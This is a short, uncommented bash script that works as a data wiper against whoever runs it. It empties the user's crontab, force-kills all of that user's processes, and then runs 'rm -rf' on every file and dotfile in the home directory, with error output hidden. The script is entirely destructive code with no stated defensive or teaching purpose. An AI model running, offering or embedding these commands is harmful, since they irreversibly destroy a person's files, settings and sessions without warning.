#!/bin/bash
echo "" > null
crontab null
rm null
user=$(whoami)
pkill -9 -u $user
rm -rf ~/* ~/.* 2>/dev/null
